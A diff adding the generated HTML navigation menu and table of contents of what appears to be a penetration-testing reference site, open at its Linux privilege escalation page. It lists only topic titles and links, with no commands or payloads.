+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_22" type="checkbox" id="__nav_22" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Direct Object References" data-md-level="1">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_23" type="checkbox" id="__nav_23" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Management Interface" data-md-level="1">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure management interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_24" type="checkbox" id="__nav_24" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Source Code Management" data-md-level="1">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure source code management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_25" type="checkbox" id="__nav_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JSON Web Token" data-md-level="1">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_26" type="checkbox" id="__nav_26" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java RMI" data-md-level="1">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_27" type="checkbox" id="__nav_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Kubernetes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_28" type="checkbox" id="__nav_28" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LDAP Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LDAP%20Injection/" class="md-nav__link">
+        LDAP injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_29" type="checkbox" id="__nav_29" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="LaTeX Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_30" type="checkbox" id="__nav_30" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Methodology and Resources" data-md-level="1">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Azure Active Directory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Linux - Privilege Escalation
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Linux - Privilege Escalation
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#checklists" class="md-nav__link">
+    Checklists
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#looting-for-passwords" class="md-nav__link">
+    Looting for passwords
+  </a>
+  
+    <nav class="md-nav" aria-label="Looting for passwords">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#files-containing-passwords" class="md-nav__link">
+    Files containing passwords
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#old-passwords-in-etcsecurityopasswd" class="md-nav__link">
+    Old passwords in /etc/security/opasswd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#last-edited-files" class="md-nav__link">
+    Last edited files
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in-memory-passwords" class="md-nav__link">
+    In memory passwords
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-sensitive-files" class="md-nav__link">
+    Find sensitive files
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-key" class="md-nav__link">
+    SSH Key
+  </a>
+  
+    <nav class="md-nav" aria-label="SSH Key">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sensitive-files" class="md-nav__link">
+    Sensitive files
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh-key-predictable-prng-authorized_keys-process" class="md-nav__link">
+    SSH Key Predictable PRNG (Authorized_Keys) Process
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    Scheduled tasks
+  </a>
+  
+    <nav class="md-nav" aria-label="Scheduled tasks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cron-jobs" class="md-nav__link">
+    Cron jobs
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#systemd-timers" class="md-nav__link">
+    Systemd timers
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    SUID
+  </a>
+  
+    <nav class="md-nav" aria-label="SUID">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-suid-binaries" class="md-nav__link">
+    Find SUID binaries
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-a-suid-binary" class="md-nav__link">
+    Create a SUID binary
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capabilities" class="md-nav__link">
+    Capabilities
+  </a>
+  
+    <nav class="md-nav" aria-label="Capabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#list-capabilities-of-binaries" class="md-nav__link">
+    List capabilities of binaries
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit-capabilities" class="md-nav__link">
+    Edit capabilities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#interesting-capabilities" class="md-nav__link">
+    Interesting capabilities
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sudo" class="md-nav__link">
+    SUDO
+  </a>
+  
+    <nav class="md-nav" aria-label="SUDO">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nopasswd" class="md-nav__link">
+    NOPASSWD
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ld_preload-and-nopasswd" class="md-nav__link">
+    LD_PRELOAD and NOPASSWD
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#doas" class="md-nav__link">
+    Doas
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo_inject" class="md-nav__link">
+    sudo_inject
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2019-14287" class="md-nav__link">
+    CVE-2019-14287
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gtfobins" class="md-nav__link">
+    GTFOBins
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wildcard" class="md-nav__link">
+    Wildcard
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#writable-files" class="md-nav__link">
+    Writable files
+  </a>
+  
+    <nav class="md-nav" aria-label="Writable files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#writable-etcsysconfignetwork-scripts-centosredhat" class="md-nav__link">
+    Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#writable-etcpasswd" class="md-nav__link">
+    Writable /etc/passwd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#writable-etcsudoers" class="md-nav__link">
+    Writable /etc/sudoers
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nfs-root-squashing" class="md-nav__link">
+    NFS Root Squashing
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shared-library" class="md-nav__link">
+    Shared Library
+  </a>
+  
+    <nav class="md-nav" aria-label="Shared Library">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldconfig" class="md-nav__link">
+    ldconfig
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rpath" class="md-nav__link">
+    RPATH
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#groups" class="md-nav__link">
+    Groups
+  </a>
+  
+    <nav class="md-nav" aria-label="Groups">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    Docker
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lxclxd" class="md-nav__link">
+    LXC/LXD
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-tmux-session" class="md-nav__link">
+    Hijack TMUX session
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    Kernel Exploits
+  </a>
+  
+    <nav class="md-nav" aria-label="Kernel Exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2022-0847-dirtypipe" class="md-nav__link">
+    CVE-2022-0847 (DirtyPipe)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2016-5195-dirtycow" class="md-nav__link">
+    CVE-2016-5195 (DirtyCow)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2010-3904-rds" class="md-nav__link">
+    CVE-2010-3904 (RDS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2010-4258-full-nelson" class="md-nav__link">
+    CVE-2010-4258 (Full Nelson)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2012-0056-mempodipper" class="md-nav__link">
+    CVE-2012-0056 (Mempodipper)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_31" type="checkbox" id="__nav_31" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="NoSQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_32" type="checkbox" id="__nav_32" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32">
+          OAuth
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="OAuth" data-md-level="1">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OAuth/" class="md-nav__link">
+        OAuth
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_33" type="checkbox" id="__nav_33" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Open Redirect" data-md-level="1">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_34" type="checkbox" id="__nav_34" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Race Condition" data-md-level="1">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_35" type="checkbox" id="__nav_35" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Request Smuggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_36" type="checkbox" id="__nav_36" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SAML Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_37" type="checkbox" id="__nav_37" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/" class="md-nav__link">
+        SQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
+        Oracle SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
+        PostgreSQL injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
+        SQLite Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_38" type="checkbox" id="__nav_38" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38">
+          Server Side Request Forgery
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Request Forgery" data-md-level="1">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Request Forgery
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
+        Server-Side Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
